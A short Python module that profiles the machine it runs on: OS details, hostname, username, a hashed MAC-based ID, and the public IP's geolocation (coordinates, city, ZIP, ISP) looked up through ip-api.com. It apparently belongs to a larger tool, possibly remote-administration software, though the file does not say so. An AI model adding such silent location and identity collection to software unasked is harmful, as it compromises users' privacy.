# Date: 07/22/2018
# Author: Pure-L0G1C
# Description: Machine information

import socket
from uuid import getnode
from requests import get
from hashlib import sha256
from getpass import getuser
from platform import system, node, release, version


class System(object):

    def __init__(self):
        self.system = system()
        self.hostname = node()
        self.release = release()
        self.version = version()
        self.username = getuser()
        self.uuid = self.get_id()

    def get_id(self):
        return sha256((str(getnode()) + getuser()).encode()).digest().hex()

    def sys_info(self):
        return {
            'uuid': self.uuid,
            'system': self.system,
            'release': self.release,
            'version': self.version,
            'hostname': self.hostname,
            'username': self.username
        }


class Geo(object):

    def __init__(self):
        self.geo = self.get_geo()
        self.internal_ip = self.get_internal_ip()

    def get_internal_ip(self):
        ip = ''
        try:
            host_name = socket.gethostname()
            ip = socket.gethostbyname(host_name)
        except:
            pass
        return ip

    def get_geo(self):
        try:
            return get('http://ip-api.com/json').json()
        except:
            pass

    def net_info(self):
        data = self.get_geo()
        if data:
            i_ip = self.internal_ip
            if i_ip:
                data['internalIp'] = i_ip
        return data


class Information(object):

    def __init__(self):
        self.net_info = Geo().net_info()
        self.sys_info = System().sys_info()

    def parse(self, data):
        data = {
            'lat': data['lat'] if 'lat' in data else '',
            'lon': data['lon'] if 'lon' in data else '',
            'zip': data['zip'] if 'zip' in data else '',
            'isp': data['isp'] if 'isp' in data else '',
            'city': data['city'] if 'city' in data else '',
            'query': data['query'] if 'query' in data else '',
            'country': data['country'] if 'country' in data else '',
            'timezone': data['timezone'] if 'timezone' in data else '',
            'regionName': data['regionName'] if 'regionName' in data else '',
            'internalIp': data['internalIp'] if 'internalIp' in data else ''
        }

        if '/' in data['timezone']:
            data['timezone'] = data['timezone'].replace('/', ' ')

        if '_' in data['timezone']:
            data['timezone'] = data['timezone'].replace('_', ' ')

        return data

    def get_info(self):
        data = self.net_info
        return {
            'sys_info': self.sys_info,
            'net_info': self.parse(data if data else [])
        }
